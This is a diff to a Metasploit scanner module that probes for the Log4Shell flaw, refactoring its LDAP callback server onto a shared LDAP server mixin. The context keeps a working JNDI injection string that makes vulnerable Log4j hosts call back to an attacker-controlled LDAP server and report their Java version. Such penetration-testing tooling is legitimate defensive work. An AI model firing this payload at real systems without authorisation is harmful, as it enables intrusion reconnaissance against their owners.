@@ -6,7 +6,7 @@
 class MetasploitModule < Msf::Auxiliary
 
   include Msf::Exploit::Remote::HttpClient
-  include Msf::Exploit::Remote::TcpServer
+  include Msf::Exploit::Remote::LDAP::Server
   include Msf::Auxiliary::Scanner
 
   def initialize
@@ -52,26 +52,13 @@ class MetasploitModule < Msf::Auxiliary
     "${jndi:ldap://#{datastore['SRVHOST']}:#{datastore['SRVPORT']}/#{resource}/${sys:java.vendor}_${sys:java.version}}"
   end
 
-  def on_client_connect(client)
-    client.extend(Net::BER::BERParser)
-    pdu = Net::LDAP::PDU.new(client.read_ber(Net::LDAP::AsnSyntax))
-    return unless pdu.app_tag == Net::LDAP::PDU::BindRequest
-
-    response = [
-      pdu.message_id.to_ber,
-      [
-        Net::LDAP::ResultCodeSuccess.to_ber_enumerated, ''.to_ber, ''.to_ber
-      ].to_ber_appsequence(Net::LDAP::PDU::BindResult)
-    ].to_ber_sequence
-    client.write(response)
-
-    pdu = Net::LDAP::PDU.new(client.read_ber(Net::LDAP::AsnSyntax))
-    return unless pdu.app_tag == Net::LDAP::PDU::SearchRequest
+  def on_request_pdu(cli, pdu)
+    return service.default_on_request_pdu(cli, pdu) unless pdu.app_tag == Net::LDAP::PDU::SearchRequest
 
     base_object = pdu.search_parameters[:base_object].to_s
     token, java_version = base_object.split('/', 2)
 
-    unless (context = @tokens.delete(token)).nil?
+    if (context = @tokens.delete(token))
       details = normalize_uri(context[:target_uri]).to_s
       details << " (header: #{context[:headers].keys.first})" unless context[:headers].nil?
       details << " (java: #{java_version})" unless java_version.blank?
@@ -84,10 +71,8 @@ class MetasploitModule < Msf::Auxiliary
         refs: references
       )
     end
-  rescue Net::LDAP::PDU::Error => e
-    vprint_error("#{peer} - #{e}")
-  ensure
-    service.close_client(client)
+
+    nil
   end
 
   def rand_text_alpha_lower_numeric(len, bad = '')
@@ -102,7 +87,7 @@ class MetasploitModule < Msf::Auxiliary
     @tokens = {}
     # always disable SSL because the LDAP server doesn't use it but the setting is shared with the HTTP requests
     begin
-      start_service('SSL' => false)
+      start_service
     rescue Rex::BindFailed => e
       fail_with(Failure::BadConfig, e.to_s)
     end
@@ -113,11 +98,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def replicant
-    # don't duplicate the service
-    service = @service
-    @service = nil
     obj = super
-    @service = service
 
     # but do duplicate the mutable tokens hash
     obj.tokens = tokens
